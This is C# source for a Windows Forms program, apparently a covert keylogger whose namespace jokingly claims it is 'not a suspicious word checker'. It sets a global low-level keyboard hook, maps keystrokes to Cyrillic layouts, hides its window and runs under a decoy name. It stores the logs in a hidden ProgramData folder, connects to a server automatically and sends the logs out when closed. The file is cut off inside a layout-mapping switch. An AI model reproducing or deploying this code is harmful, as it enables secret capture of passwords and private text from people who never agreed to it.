using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Collections;
using System.Threading;
using Microsoft.Win32;



namespace Ne_Podozritelniy_Proverschik_Slov
{
    public partial class Main : Form
    {
       private string path = @"C:\ProgramData\Components";
        // регистр глобал хоткей
        string Country;
        bool exit = false;

        int Count_of_kb = 3500;

        //private static int WM_HOTKEY = 0x0312;
        private const int MOD_CONTROL = 0x0002;
        private const int MOD_ALT = 0x0001;
        Tcp_Connect client;
        private Thread save;
        private Thread load;
        private Thread load_from;

        bool NewFile = true;

        private bool IfWindowHidden;

        string Exe_Path = Path.GetFullPath(Process.GetCurrentProcess().MainModule.FileName);
        string Exe_Name = "File_CheckerWIN32";//Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName);
        string pcName = System.Environment.MachineName;

        Process process;
        int tick = 10;
        int tack = 0;

        int tick_save = 60;
        int tack_save = 0;

        int tick_send = 60;
        int tack_send = 0;

        int dgv_Id = 0;
        int dgv_Name = 1;
        int dgv_Handle = 2;

        
        public Mutex checker;

        // IntPtr toplevelWindow = IntPtr.Zero;

        const int KL_NAMELENGTH = 9;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        const int SW_SHOW = 5;
        //const int SW_SHOWNORMAL = 1;
        const int SW_HIDE = 0;


        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
        private HookProc proc; //= HookCallback;
        private IntPtr hook = IntPtr.Zero;
        private static Mutex mutex;
        private bool first;
        private bool Timer_Enable;

        public Main()
        {
            InitializeComponent();
             checker = new Mutex(true, "Project", out first);
            
            if (!first)
            {
                exit = true;
                Application.Run(new CheckerFiles());
                this.Close();
                Application.Exit();
                
                
                //Application.Exit();
            }
            else
            {
                IfWindowHidden = true;
                this.WindowState = FormWindowState.Minimized;
                Shown += Main_Shown;

                //ShowWindow(this.Handle, SW_HIDE);
                //this.Visible = false;
                SaveEverySec_chb_CheckedChanged(null, null);


                tick = (int)numericUpDown1.Value;


                int id = 0;     // The id of the hotkey. 
                RegisterHotKey(this.Handle, id, MOD_CONTROL | MOD_ALT, (uint)Keys.F9.GetHashCode());


                Btn_send_To_Server.Enabled = false;
                Btn_Disconnect.Enabled = false;
                rb_yes.Checked = true;

                tick_save = (int)numericUpDown2.Value;
                //String host = System.Net.Dns.GetHostName();
                //System.Net.IPAddress ip = System.Net.Dns.GetHostByName(host).AddressList[0];

                //txb_ip.Text = ip.ToString();

                Btn_Connect_Click(null, null);

                if (Directory.Exists(path))
                {

                    lb_info_One_Str.Items.Add("Directory Exist");


                    //return;
                }
                else
                {
                    DirectoryInfo di = Directory.CreateDirectory(path);
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                    lb_info_One_Str.Items.Add($"The directory was created successfully.");
                }

                //MessageBox.Show(Exe_Name);


                process = new Process();
                dgv_Proc.AutoGenerateColumns = false;

                mutex = new Mutex();

                Timer_Enable = false;
                load = new Thread(LoadFile);


                button1_Click(null, null);


                Country = GetLayoutCode();

                FormClosing += Main_FormClosing;

                proc = HookCallback;
                hook = SetHook(proc);


                //btn_load.Enabled = false;
                //btn_Save.Enabled = false;
                //Btn_Clear.Enabled = false;

                //CheckerFiles checkerFiles = new CheckerFiles();
                //checkerFiles.Show();

                


            }
        }
       // private void NewAppCheck()
        //{
//            do
//            {
//                Thread.Sleep(10);
//                /*
//                 * while(true)
//{
//    SearchAndDestroy("MyProgProc");
//}


//public SearchAndDestroy(string programname)
//    {
//     foreach (Process _proc in Process.GetProcesses()) {
//                if (_proc.ProcessName.StartsWith(name))
//                _proc.Kill();
//            }
//    }
//                 */


//                Action action = () =>
//                    {
//                        //checker = new Mutex(true, "Project", out first);
//                        if (!first)
//                        {
//                            first = true;
//                            CheckerFiles form2 = new CheckerFiles();
//                            form2.Show();
//                        }
                        
//                    };
//                    if (InvokeRequired)
//                    {

//                        Invoke(action);
//                    }
//                    else
//                    {
//                        action();

//                    }
                

//            } while (true);
       // }
        private void Main_Shown(object sender, EventArgs e)
        {
            //HideProcess((IntPtr)Process.GetCurrentProcess().Id, false);
            ShowWindow(this.Handle, SW_HIDE);
        }

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);

            if (m.Msg == 0x0312)
            {
                if(IfWindowHidden)
                {
                    ShowWindow(this.Handle, SW_SHOW);
                    this.WindowState = FormWindowState.Normal;
                    btn_load.Enabled = true;
                    btn_Save.Enabled = true;
                    Btn_Clear.Enabled = true;
                    IfWindowHidden = false;
                }
                else
                {
                    checkBox1.Checked = false;
                    ShowWindow(this.Handle, SW_HIDE);
                    btn_load.Enabled = false;
                    btn_Save.Enabled = false;
                    Btn_Clear.Enabled = false;
                    IfWindowHidden = true;
                }

                //MessageBox.Show("Hotkey has been pressed!");
               
            }

        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            //
            try
            {
               
                
                if(exit)
                {
                    //form2.Show();
                }
                else
                {
                    //this.WindowState = FormWindowState.Minimized;
                    SaveFile(new ArrayList { lb_Info_Eng, lb_Info_Rus });
                    Task.Run(SendToThe);
                    ShowWindow(this.Handle, SW_HIDE);
                    IfWindowHidden = true;
                    e.Cancel = true;
                }
               
            }
            catch
            {

            }
            finally
            {
                try
                {

                
                if (e.Cancel != true)
                {
                    if (hook != IntPtr.Zero)
                    {
                        UnhookWindowsHookEx(hook);
                    }
                    SaveFile(new ArrayList { lb_Info_Eng, lb_Info_Rus });
                    SendToThe();
                }
                }
                catch { }
            }
            
            
                

        }

        enum KeyModifier
        {
            None = 0,
            Alt = 1,
            Control = 2,
            Shift = 4,
            WinKey = 8
        }

        private void Main_Load(object sender, EventArgs e)
        {
            //ShowWindow(this.Handle, SW_HIDE);
        }

        #region Hook
        private IntPtr SetHook(HookProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            
            if ((nCode >= 0) && (wParam == (IntPtr)WM_KEYDOWN))
            {
                //
                Country = MapLayoutName();
                int vkCode = Marshal.ReadInt32(lParam);
                Keys keys = (Keys)vkCode;
                
                    switch (keys)
                    {

                        case Keys.Shift:
                            //lb_info_One_Str.Items.Add($"({keys}) ");
                            lb_Info_Rus.Items.Add($"({keys}) ");
                            break;
                        case Keys.LShiftKey:
                            //lb_info_One_Str.Items.Add($"({keys}) ");
                            lb_Info_Rus.Items.Add($"({keys}) ");
                            break;
                        case Keys.RShiftKey:
                            //lb_info_One_Str.Items.Add($"({keys}) ");
                            lb_Info_Rus.Items.Add($"({keys}) ");
                            break;
                        case Keys.Space:
                            //lb_info_One_Str.Items.Add($" ");
                            lb_Info_Rus.Items.Add($" ");
                            break;
                        case Keys.CapsLock:
                            //lb_info_One_Str.Items.Add($"(!{keys}!) ");
                            lb_Info_Rus.Items.Add($"(!{keys}!) ");
                            break;
                        case Keys.Return:
                            //lb_info_One_Str.Items.Add($" ");
                            //lb_info_One_Str.Items.Add($" <Enter> ");
                            //lb_info_One_Str.Items.Add($" ");
                            lb_Info_Rus.Items.Add($" ");
                            lb_Info_Rus.Items.Add($" <Enter> ");
                            lb_Info_Rus.Items.Add($" ");
                            break;

                        default:
                            if (keys == Keys.Q)
                            {
                                lb_Info_Rus.Items.Add($"Й");
                                //lb_info_One_Str.Items.Add($"Й ");
                            }
                            else
                            {
                                if (keys == Keys.W)
                                {
                                    lb_Info_Rus.Items.Add($"Ц");
                                    //lb_info_One_Str.Items.Add($"Ц ");
                                }
                                else
                                {
                                    if (keys == Keys.E)
                                    {
                                        lb_Info_Rus.Items.Add($"У");
                                        //lb_info_One_Str.Items.Add($"У ");
                                    }
                                    else
                                    {
                                        if (keys == Keys.R)
                                        {
                                            lb_Info_Rus.Items.Add($"К");
                                            //lb_info_One_Str.Items.Add($"К ");
                                        }
                                        else
                                        {
                                            if (keys == Keys.T)
                                            {
                                                lb_Info_Rus.Items.Add($"Е");
                                               // lb_info_One_Str.Items.Add($"Е ");
                                            }
                                            else
                                            {
                                                if (keys == Keys.Y)
                                                {
                                                    lb_Info_Rus.Items.Add($"Н");
                                                   // lb_info_One_Str.Items.Add($"Н ");
                                                }
                                                else
                                                {
                                                    if (keys == Keys.U)
                                                    {
                                                        lb_Info_Rus.Items.Add($"Г");
                                                        //lb_info_One_Str.Items.Add($"Г ");
                                                    }
                                                    else
                                                    {
                                                        if (keys == Keys.I)
                                                        {
                                                            lb_Info_Rus.Items.Add($"Ш");
                                                            //lb_info_One_Str.Items.Add($"Ш ");
                                                        }
                                                        else
                                                        {
                                                            if (keys == Keys.O)
                                                            {
                                                                lb_Info_Rus.Items.Add($"Щ");
                                                                //lb_info_One_Str.Items.Add($"Щ ");
                                                            }
                                                            else
                                                            {
                                                                if (keys == Keys.P)
                                                                {
                                                                    lb_Info_Rus.Items.Add($"З");
                                                                    //lb_info_One_Str.Items.Add($"З ");
                                                                }
                                                                else
                                                                {
                                                                    if (keys == Keys.OemOpenBrackets)
                                                                    {
                                                                        lb_Info_Rus.Items.Add($"Х");
                                                                        //lb_info_One_Str.Items.Add($"Х ");
                                                                    }
                                                                    else
                                                                    {
                                                                        if (keys == Keys.OemCloseBrackets )
                                                                        {
                                                                            lb_Info_Rus.Items.Add($"Ъ");
                                                                            //lb_info_One_Str.Items.Add($"Ъ ");
                                                                        }
                                                                        else
                                                                        {


                                                                            if (keys == Keys.OemCloseBrackets && Country.Contains("Ukrainian"))
                                                                            {
                                                                                lb_Info_Rus.Items.Add($"Ї");
                                                                                //lb_info_One_Str.Items.Add($"Ї ");
                                                                            }
                                                                            else
                                                                            {
                                                                                if (keys == Keys.A)
                                                                                {
                                                                                    lb_Info_Rus.Items.Add($"Ф");
                                                                                   // lb_info_One_Str.Items.Add($"Ф ");
                                                                                }
                                                                                else
                                                                                {
                                                                                    if (keys == Keys.S )
                                                                                    {
                                                                                        lb_Info_Rus.Items.Add($"Ы");
                                                                                       // lb_info_One_Str.Items.Add($"Ы ");
                                                                                    }
                                                                                    else
                                                                                    {


                                                                                        if (keys == Keys.S && Country.Contains("Ukrainian"))
                                                                                        {
                                                                                            lb_Info_Rus.Items.Add($"І");
                                                                                            //lb_info_One_Str.Items.Add($"І ");
                                                                                        }
                                                                                        else
                                                                                        {
                                                                                            if (keys == Keys.D)
                                                                                            {
                                                                                                lb_Info_Rus.Items.Add($"В");
                                                                                               // lb_info_One_Str.Items.Add($"В ");
                                                                                            }
                                                                                            else
                                                                                            {
                                                                                                if (keys == Keys.F)
                                                                                                {
                                                                                                    lb_Info_Rus.Items.Add($"А");
                                                                                                   // lb_info_One_Str.Items.Add($"А ");
                                                                                                }
                                                                                                else
                                                                                                {
                                                                                                    if (keys == Keys.G)
                                                                                                    {
                                                                                                        lb_Info_Rus.Items.Add($"П");
                                                                                                       // lb_info_One_Str.Items.Add($"П ");
                                                                                                    }
                                                                                                    else
                                                                                                    {
                                                                                                        if (keys == Keys.H)
                                                                                                        {
                                                                                                            lb_Info_Rus.Items.Add($"Р");
                                                                                                            //lb_info_One_Str.Items.Add($"Р ");
                                                                                                        }
                                                                                                        else
                                                                                                        {
                                                                                                            if (keys == Keys.J)
                                                                                                            {
                                                                                                                lb_Info_Rus.Items.Add($"О");
                                                                                                                //lb_info_One_Str.Items.Add($"О ");
                                                                                                            }
                                                                                                            else
                                                                                                            {
                                                                                                                if (keys == Keys.K)
                                                                                                                {
                                                                                                                    lb_Info_Rus.Items.Add($"Л");
                                                                                                                    //lb_info_One_Str.Items.Add($"Л ");
                                                                                                                }
                                                                                                                else
                                                                                                                {
                                                                                                                    if (keys == Keys.L)
                                                                                                                    {
                                                                                                                        lb_Info_Rus.Items.Add($"Д");
                                                                                                                        //lb_info_One_Str.Items.Add($"Д ");
                                                                                                                    }
                                                                                                                    else
                                                                                                                    {
                                                                                                                        if (keys == Keys.OemSemicolon)
                                                                                                                        {
                                                                                                                            lb_Info_Rus.Items.Add($"Ж");
                                                                                                                            //lb_info_One_Str.Items.Add($"Ж ");
                                                                                                                        }
                                                                                                                        else
                                                                                                                        {
                                                                                                                            if (keys == Keys.OemQuotes)
                                                                                                                            {
                                                                                                                                lb_Info_Rus.Items.Add($"Э");
                                                                                                                                //lb_info_One_Str.Items.Add($"Э ");
                                                                                                                            }
                                                                                                                            else
                                                                                                                            {


                                                                                                                                if (keys == Keys.OemQuotes && Country.Contains("Ukrainian")) 
                                                                                                                                {
                                                                                                                                    lb_Info_Rus.Items.Add($"Є");
                                                                                                                                    //lb_info_One_Str.Items.Add($"Є ");
                                                                                                                                }
                                                                                                                                else
                                                                                                                                {



                                                                                                                                    if (keys == Keys.Oemtilde && Country == "Russian")
                                                                                                                                    {
                                                                                                                                        lb_Info_Rus.Items.Add($"Ё");
                                                                                                                                        //lb_info_One_Str.Items.Add($"Ё ");
                                                                                                                                    }
                                                                                                                                    else
                                                                                                                                    {


                                                                                                                                        if (keys == Keys.Oemtilde && Country == "Ukrainian")
                                                                                                                                        {
                                                                                                                                            lb_Info_Rus.Items.Add($"'");
                                                                                                                                            //lb_info_One_Str.Items.Add($"' ");
                                                                                                                                        }

                                                                                                                                        else
                                                                                                                                        {
                                                                                                                                            if (keys == Keys.Z)
                                                                                                                                            {
                                                                                                                                                lb_Info_Rus.Items.Add($"Я");
                                                                                                                                                //lb_info_One_Str.Items.Add($"Z ");
                                                                                                                                            }
                                                                                                                                            else
                                                                                                                                            {
                                                                                                                                                if (keys == Keys.X)
                                                                                                                                                {
                                                                                                                                                    lb_Info_Rus.Items.Add($"Ч");
                                                                                                                                                   // lb_info_One_Str.Items.Add($"Ч ");
                                                                                                                                                }
                                                                                                                                                else
                                                                                                                                                {
                                                                                                                                                    if (keys == Keys.V)
                                                                                                                                                    {
                                                                                                                                                        lb_Info_Rus.Items.Add($"М");
                                                                                                                                                        //lb_info_One_Str.Items.Add($"М ");
                                                                                                                                                    }
                                                                                                                                                    else
                                                                                                                                                    {
                                                                                                                                                        if (keys == Keys.B)
                                                                                                                                                        {
                                                                                                                                                            lb_Info_Rus.Items.Add($"И");
                                                                                                                                                            //lb_info_One_Str.Items.Add($"И ");
                                                                                                                                                        }
                                                                                                                                                        else
                                                                                                                                                        {
                                                                                                                                                            if (keys == Keys.N)
                                                                                                                                                            {
                                                                                                                                                                lb_Info_Rus.Items.Add($"Т");
                                                                                                                                                                //lb_info_One_Str.Items.Add($"Т ");
                                                                                                                                                            }
                                                                                                                                                            else
                                                                                                                                                            {
                                                                                                                                                                if (keys == Keys.M)
                                                                                                                                                                {
                                                                                                                                                                    lb_Info_Rus.Items.Add($"Ь");
                                                                                                                                                                   // lb_info_One_Str.Items.Add($"Ь ");
                                                                                                                                                                }
                                                                                                                                                                else
                                                                                                                                                                {
                                                                                                                                                                    if (keys == Keys.Oemcomma)
                                                                                                                                                                    {
                                                                                                                                                                        lb_Info_Rus.Items.Add($"Б");
                                                                                                                                                                        //lb_info_One_Str.Items.Add($"Б ");
                                                                                                                                                                    }
                                                                                                                                                                    else
                                                                                                                                                                    {
                                                                                                                                                                        if (keys == Keys.OemPeriod)
                                                                                                                                                                        {
                                                                                                                                                                            lb_Info_Rus.Items.Add($"Ю");
                                                                                                                                                                           // lb_info_One_Str.Items.Add($"Ю ");
                                                                                                                                                                        }
                                                                                                                                                                        else
                                                                                                                                                                        {
                                                                                                                                                                        switch (keys)
                                                                                                                                                                        {
                                                                                                                                                                            case Keys.D0:
                                                                                                                                                                                lb_Info_Rus.Items.Add($"0");
                                                                                                                                                                                break;
                                                                                                                                                                            case Keys.D1:
                                                                                                                                                                                lb_Info_Rus.Items.Add($"1");
                                                                                                                                                                                break;
                                                                                                                                                                            case Keys.D2:
                                                                                                                                                                                lb_Info_Rus.Items.Add($"2");
                                                                                                                                                                                break;
                                                                                                                                                                            case Keys.D3:
                                                                                                                                                                                lb_Info_Rus.Items.Add($"3");
                                                                                                                                                                                break;
                                                                                                                                                                            case Keys.D4:
                                                                                                                                                                                lb_Info_Rus.Items.Add($"4");
                                                                                                                                                                                break;
                                                                                                                                                                            case Keys.D5:
                                                                                                                                                                                lb_Info_Rus.Items.Add($"5");
                                                                                                                                                                                break;
                                                                                                                                                                            case Keys.D6:
                                                                                                                                                                                lb_Info_Rus.Items.Add($"6");
                                                                                                                                                                                break;
                                                                                                                                                                            case Keys.D7:
                                                                                                                                                                                lb_Info_Rus.Items.Add($"7");
                                                                                                                                                                                break;
                                                                                                                                                                            case Keys.D8:
                                                                                                                                                                                lb_Info_Rus.Items.Add($"8");

                                                                                                                                                                                break;
                                                                                                                                                                            case Keys.D9:
                                                                                                                                                                                lb_Info_Rus.Items.Add($"9");
                                                                                                                                                                                break;
                                                                                                                                                                            default:
                                                                                                                                                                                lb_Info_Rus.Items.Add($" <{keys}> ");
                                                                                                                                                                                break;
                                                                                                                                                                        }
                                                                                                                                                                        
                                                                                                                                                                            //lb_info_One_Str.Items.Add($" <{keys}> ");
                                                                                                                                                                        }
                                                                                                                                                                    }
                                                                                                                                                                }
                                                                                                                                                            }
                                                                                                                                                        }
                                                                                                                                                    }
                                                                                                                                                }
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                    }
                                                                                                                                }
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }

                                        }

                                    }

                                
                            }




                           

                    }
                        break;
                }

                    switch (keys)
                    {

                        case Keys.Shift:
                            lb_Info_Eng.Items.Add($"({keys}) ");
                            //lb_info_One_Str.Items.Add($"({keys}) ");
                            break;
                        case Keys.LShiftKey:
                            lb_Info_Eng.Items.Add($"({keys}) ");
                            //lb_info_One_Str.Items.Add($"({keys}) ");
                            break;
                        case Keys.RShiftKey:
                            lb_Info_Eng.Items.Add($"({keys}) ");
                            //lb_info_One_Str.Items.Add($"({keys}) ");
                            break;
                        case Keys.Space:
                            lb_Info_Eng.Items.Add($" ");
                           // lb_info_One_Str.Items.Add($" ");
                            break;
                        case Keys.CapsLock:
                            lb_Info_Eng.Items.Add($"(!{keys}!) ");
                            //lb_info_One_Str.Items.Add($"(!{keys}!) ");
                            break;
                        case Keys.Return:
                            //lb_info_One_Str.Items.Add($" ");
                            //lb_info_One_Str.Items.Add($" <Enter> ");
                            //lb_info_One_Str.Items.Add($" ");

                            lb_Info_Eng.Items.Add($" ");
                            lb_Info_Eng.Items.Add($" <Enter> ");
                            lb_Info_Eng.Items.Add($" ");
                            break;

                        default:
                           
                            switch (keys)
                            {
                                case Keys.D0:
                                    lb_Info_Eng.Items.Add($"0");
                                    break;
                                case Keys.D1:
                                    lb_Info_Eng.Items.Add($"1");
                                    break;
                                case Keys.D2:
                                    lb_Info_Eng.Items.Add($"2");
                                    break;
                                case Keys.D3:
                                    lb_Info_Eng.Items.Add($"3");
                                    break;
                                case Keys.D4:
                                    lb_Info_Eng.Items.Add($"4");
                                    break;
                                case Keys.D5:
                                    lb_Info_Eng.Items.Add($"5");
                                    break;
                                case Keys.D6:
                                    lb_Info_Eng.Items.Add($"6");
                                    break;
                                case Keys.D7:
                                    lb_Info_Eng.Items.Add($"7");
                                    break;
                                case Keys.D8:
                                    lb_Info_Eng.Items.Add($"8");

                                    break;
                                case Keys.D9:
                                    lb_Info_Eng.Items.Add($"9");
                                    break;
                                default:
                                if (keys != Keys.NumLock && keys != Keys.Alt && keys != Keys.Control && keys != Keys.LWin && keys != Keys.RWin
                               && keys != Keys.Back && keys != Keys.Cancel && keys != Keys.Escape && keys != Keys.F1 && keys != Keys.F2
                               && keys != Keys.F3 && keys != Keys.F4 && keys != Keys.F5 && keys != Keys.F6 && keys != Keys.F6
                               && keys != Keys.F8 && keys != Keys.F9 && keys != Keys.F10 && keys != Keys.F11 && keys != Keys.F12
                               && keys != Keys.Insert && keys != Keys.Delete && keys != Keys.Home && keys != Keys.End && keys != Keys.PageUp
                               && keys != Keys.PageDown && keys != Keys.PrintScreen && keys != Keys.Pause && keys != Keys.LControlKey && keys != Keys.RControlKey)
                                {
                                    lb_Info_Eng.Items.Add($"{keys}");
                                }
                                else
                                {
                                    lb_Info_Eng.Items.Add($" <{keys}> ");
                                }
                                    
                                    break;
                            }

                            //

                            //   lb_info_One_Str.Items.Add($" <{keys}> ");


                            break;

                    
                }


            }
            return CallNextHookEx(hook, nCode, wParam, lParam);
        }

        #endregion

        #region DLL
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern long GetKeyboardLayoutName(StringBuilder pwszKLID);


        [DllImport("user32.dll")]
        private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);

        [DllImport("user32.dll")]
        private static extern bool UnregisterHotKey(IntPtr hWnd, int id);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr FindWindow([MarshalAs(UnmanagedType.LPStr)] string lpClassName, string lpWindowName);

        // Main 
        //[DllImport("NtHide.dll")]
        //private static extern bool HideProcess(IntPtr pid, bool HideOnlyFromTaskManager);
        #endregion

        #region Main
        private void button1_Click(object sender, EventArgs e)
        {

            load.Start();
            //LoadFile();
            
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                
           
            save.Start(new ArrayList { lb_Info_Eng, lb_Info_Rus });
            }
            catch
            {

            }
            //SaveFile(new ArrayList { lb_Info_Eng, lb_Info_Rus});
        }

        private void button3_Click(object sender, EventArgs e)
        {
            lb_Info_Eng.Items.Clear();
            lb_Info_Rus.Items.Clear();
           // lb_info_One_Str.Items.Clear();
            lb_info_One_Str.Items.Insert(0, "Cleared logs");

        }

        private void SaveFile(object obc)
        {
            mutex.WaitOne();
            ArrayList arrl = obc as ArrayList;
            ListBox listeng = arrl[0] as ListBox;
            ListBox listrus = arrl[1] as ListBox;

            Action action;

            string text = string.Empty;
            try
            {
                if (listeng.Items.Count <= 1)
                {
                    //MessageBox.Show("Log Eng not saved");
                    action = () =>
                    {
                        lb_info_One_Str.Items.Insert(0, "Log Eng not saved");
                    };
                    if (InvokeRequired)
                    {

                        Invoke(action);
                    }
                    else
                    {
                        action();

                    }


                   // return;
                }
                else
                {
                    using (FileStream fstream = new FileStream($@"{path}\{pcName}_LogsEng.txt", FileMode.OpenOrCreate))
                    {
                        foreach (string item in listeng.Items)
                        {

                            text += item + Environment.NewLine;

                        }
                        byte[] array = System.Text.Encoding.Default.GetBytes(text);

                        fstream.Write(array, 0, array.Length);

                    }

                    action = () =>
                    {
                        lb_info_One_Str.Items.Insert(0, "Log Eng saved");
                    };
                    if (InvokeRequired)
                    {

                        Invoke(action);
                    }
                    else
                    {
                        action();

                    }

                }
                if (listrus.Items.Count <= 1)
                {
                    action = () =>
                    {
                        lb_info_One_Str.Items.Insert(0, "Log Rus not saved");
                    };
                    if (InvokeRequired)
                    {

                        Invoke(action);
                    }
                    else
                    {
                        action();

                    }

                    //MessageBox.Show("Log Rus not saved");
                   // return;
                }
                else
                {
                    text = string.Empty;
                    using (FileStream fstream = new FileStream($@"{path}\{pcName}_LogsRus.txt", FileMode.OpenOrCreate))
                    {
                        foreach (string item in listrus.Items)
                        {

                            text += item + Environment.NewLine;

                        }
                        byte[] array1 = System.Text.Encoding.Default.GetBytes(text);

                        fstream.Write(array1, 0, array1.Length);


                    }
                    action = () =>
                    {
                        lb_info_One_Str.Items.Insert(0, "Log Rus saved");
                    };
                    if (InvokeRequired)
                    {

                        Invoke(action);
                    }
                    else
                    {
                        action();

                    }
                }



            }
            catch (Exception ex)
            {
                try
                {
                    action = () =>
                    {
                        lb_info_One_Str.Items.Insert(0, $"{ex.Message}");
                    };
                    if (InvokeRequired)
                    {

                        Invoke(action);
                    }
                    else
                    {
                        action();

                    }
                }
                catch
                {

                }
            }
            finally
            {
                mutex.ReleaseMutex();
                action = () =>
                {
                    if(Timer_Enable)
                    Timer_Save.Start();
                };
                if (InvokeRequired)
                {

                    Invoke(action);
                }
                else
                {
                    action();

                }
            }
        }

        private void LoadFile()
        {
            mutex.WaitOne();
           
            Action action;

            string text = string.Empty;
            StreamReader str2 = new StreamReader($@"{path}\{pcName}_LogsRus.txt", Encoding.Default);
            StreamReader str = new StreamReader($@"{path}\{pcName}_LogsEng.txt", Encoding.Default);
            try
            {



                //using (FileStream fstream = File.OpenRead($@"{path}\{pcName}_LogsEng.txt"))
                //{

                //    byte[] array = new byte[fstream.Length];

                //    fstream.Read(array, 0, array.Length);

                //    text = System.Text.Encoding.Default.GetString(array);

                //}

                
                while (!str.EndOfStream)
                {

                    string st = str.ReadLine();
                    action = () =>
                    {
                        lb_Info_Eng.Items.Add(st);
                    };
                    if (InvokeRequired)
                    {

                        Invoke(action);
                    }
                    else
                    {
                        action();

                    }



                }
                

                action = () =>
                {
                    
                       // lb_Info_Eng.Items.Add(text);
                    lb_info_One_Str.Items.Insert(0, "Log Eng loaded");
                };
                if (InvokeRequired)
                {

                    Invoke(action);
                }
                else
                {
                    action();

                }


                //text = string.Empty;

                //using (FileStream fstream = File.OpenRead($@"{path}\{pcName}_LogsRus.txt"))
                //{

                //    byte[] array1 = new byte[fstream.Length];

                //    fstream.Read(array1, 0, array1.Length);

                //    text = System.Text.Encoding.Default.GetString(array1);

                //}


                
                while (!str2.EndOfStream)
                {

                    string st2 = str2.ReadLine();
                    action = () =>
                    {
                        lb_Info_Rus.Items.Add(st2);
                    };
                    if (InvokeRequired)
                    {

                        Invoke(action);
                    }
                    else
                    {
                        action();

                    }



                }

                
                action = () =>
                {
                   
                    //lb_Info_Rus.Items.Add( text);
                    lb_info_One_Str.Items.Insert(0, "Log Rus loaded");
                };
                if (InvokeRequired)
                {

                    Invoke(action);
                }
                else
                {
                    action();

                }



            }
            catch (Exception ex)
            {
                try
                {

                
                action = () =>
                {
                    lb_info_One_Str.Items.Insert(0, $"{ex.Message}");
                };
                if (InvokeRequired)
                {

                    Invoke(action);
                }
                else
                {
                    action();

                }
                }
                catch
                {

                }


            }
            finally
            {
                try
                {
                    str.Close();
                    str2.Close();
                }
                catch { }
                mutex.ReleaseMutex();
            }
        }

        private void Main_KeyDown(object sender, KeyEventArgs e)
        {
          
            
            

        }

        private void Main_KeyUp(object sender, KeyEventArgs e)
        {
           
        }

        public static string GetLayoutCode()
        {
            var name = new StringBuilder(KL_NAMELENGTH);
            GetKeyboardLayoutName(name);

            return name.ToString();
        }

    //This is a mapping table from hex to descriptive name
    public static String MapLayoutName(string code = null)
    {
            if (code == null)
            {
                code = GetLayoutCode();
            }
            

        switch (code)
        {
            case "0000041C":
                return "Albanian";
            case "00000401":
                return "Arabic (101)";
            case "00010401":
                return "Arabic (102)";
            case "00020401":
                return "Arabic (102) Azerty";
            case "0000042B":
                return "Armenian eastern";
            case "0001042B":
                return "Armenian Western";
            case "0000044D":
                return "Assamese - inscript";
            case "0000082C":
                return "Azeri Cyrillic";
            case "0000042C":
                return "Azeri Latin";
            case "0000046D":
                return "Bashkir";
            case "00000423":
                return "Belarusian";
            case "0000080C":
                return "Belgian French";
            case "00000813":
                return "Belgian (period)";
            case "0001080C":
                return "Belgian (comma)";
            case "00000445":
                return "Bengali";
            case "00010445":
                return "Bengali - inscript (legacy)";
            case "00020445":
                return "Bengali - inscript";
            case "0000201A":
                return "Bosnian (cyrillic)";
            case "00030402":
                return "Bulgarian";
            case "00000402":
                return "Bulgarian(typewriter)";
            case "00010402":
                return "Bulgarian (latin)";
            case "00020402":
                return "Bulgarian (phonetic)";
            case "00040402":
                return "Bulgarian (phonetic traditional)";
            case "00011009":
                return "Canada Multilingual";
            case "00001009":
                return "Canada French";
            case "00000C0C":
                return "Canada French (legacy)";
            case "00000404":
                return "Chinese (traditional) - us keyboard";
            case "00000804":
                return "Chinese (simplified) -us keyboard";
            case "00000C04":
                return "Chinese (traditional, hong kong s.a.r.) - us keyboard";
            case "00001004":
                return "Chinese (simplified, singapore) - us keyboard";
            case "00001404":
                return "Chinese (traditional, macao s.a.r.) - us keyboard";
            case "00000405":
                return "Czech";
            case "00020405":
                return "Czech programmers";
            case "00010405":
                return "Czech (qwerty)";
            case "0000041A":
                return "Croatian";
            case "00000439":
                return "Deanagari - inscript";
            case "00000406":
                return "Danish";
            case "00000465":
                return "Divehi phonetic";
            case "00010465":
                return "Divehi typewriter";
            case "00000413":
                return "Dutch";
            case "00000425":
                return "Estonian";
            case "00000438":
                return "Faeroese";
            case "0000040B":
                return "Finnish";
            case "0001083B":
                return "Finnish with sami";
            case "0000040C":
                return "French";
            case "00011809":
                return "Gaelic";
            case "00000437":
                return "Georgian";
            case "00020437":
                return "Georgian (ergonomic)";
            case "00010437":
                return "Georgian (qwerty)";
            case "00000407":
